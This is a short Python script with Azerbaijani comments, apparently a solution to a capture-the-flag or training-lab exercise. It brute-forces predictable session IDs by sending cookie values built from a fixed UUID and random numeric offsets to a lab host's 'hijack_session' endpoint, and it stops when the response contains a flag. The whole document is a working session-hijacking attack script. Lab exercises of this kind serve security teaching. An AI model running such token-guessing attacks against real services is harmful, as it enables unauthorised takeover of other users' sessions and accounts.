#!/usr/bin/python3
import requests
import random
import time

# Parametrlər
uuid = "0443a59b-1347-458d-838-2118462"
base = 174722127
url = "http://web0x01.hbtn/a1/hijack_session"

# Neçə cəhd aparılsın
attempts = 100

# Eyni offset-ləri təkrar yoxlamamaq üçün set
checked = set()

print("[*] Sessiya hijacking testi başlayır...\n")

for _ in range(attempts):
    offset = random.randint(0, 5000)

    if offset in checked:
        continue
    checked.add(offset)

    session_id = f"{uuid}-{base + offset}"
    cookies = {'hijack_session': session_id}

    try:
        response = requests.post(url, cookies=cookies, timeout=5)

        if "flag" in response.text.lower():
            print(f"\n[+] ✅ FLAG TAPILDI!")
            print(f"[+] Sessiya ID: {session_id}")
            print(f"[+] Cavab:\n{response.text}")
            break
        else:
            print(f"[-] {session_id} --> Uğursuz")
        time.sleep(0.2)

    except requests.exceptions.RequestException as e:
        print(f"[!] Xəta ({session_id}): {e}")

else:
    print("\n[!] 100 cəhd sonunda flag tapılmadı.")

